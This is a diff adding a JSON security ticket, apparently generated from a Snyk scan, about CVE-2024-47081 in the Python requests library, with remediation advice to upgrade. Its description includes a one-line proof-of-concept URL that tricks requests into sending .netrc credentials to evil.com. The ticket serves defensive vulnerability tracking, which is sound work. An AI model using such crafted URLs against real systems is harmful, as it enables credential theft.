@@ -1,0 +1,24 @@
+{
+  "id": "plx-5fb5d0ff-25fd-41cc-997a-6739eb448aba",
+  "title": "[Snyk] SNYK-PYTHON-REQUESTS-10305723 in requests@2.31.0",
+  "description": "## Insertion of Sensitive Information Into Sent Data\n\n**Severity:** medium\n**Package:** requests@2.31.0\n**File:** `score-processor-lambda/requirements.txt`\n\n**CVSS Score:** 5.7  \n**Exploit Maturity:** proof-of-concept  \n**Snyk Priority Score:** 606/1000\n\n### CVEs\n- [CVE-2024-47081](https://nvd.nist.gov/vuln/detail/CVE-2024-47081)\n\n**Fix:** Pin `requests` to version 2.32.4 or later.\n\n### Details\n## Overview\n\nAffected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.\n\n**Note:**\n\nThis is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's \"intended\" part (e.g., `example.com` in `http://example.com:@evil.com/`).\n## PoC\n```\nrequests.get('http://example.com:@evil.com/&apos;)\n```\n## Remediation\nUpgrade `requests` to version 2.32.4 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b)\n- [GitHub Commit](https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae)\n- [GitHub Commit](https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef)\n- [GitHub Issue](https://github.com/psf/requests/issues/6964)\n- [GitHub PR](https://github.com/psf/requests/pull/6962)\n- [GitHub PR](https://github.com/psf/requests/pull/6963)\n- [GitHub PR](https://github.com/psf/requests/pull/6965)\n- [Seclists Full Disclosure](https://seclists.org/fulldisclosure/2025/Jun/2)\n- [Vulnerable Code](https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245)\n\n\n### Reference\n- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-10305723)",
+  "type": "sub-task",
+  "status": "open",
+  "priority": 2,
+  "assignee": null,
+  "creator": null,
+  "parent": "plx-fdaf669a-1fab-4d7a-95d8-db635c717983",
+  "labels": [
+    "security",
+    "snyk"
+  ],
+  "dependencies": [],
+  "comments": [],
+  "created_at": "2026-02-26T00:13:56.246826025Z",
+  "updated_at": "2026-02-26T00:13:56.246826025Z",
+  "closed_at": null,
+  "custom": {
+    "snyk_key": "SNYK-PYTHON-REQUESTS-10305723",
+    "snyk_severity": "medium"
+  }
+}
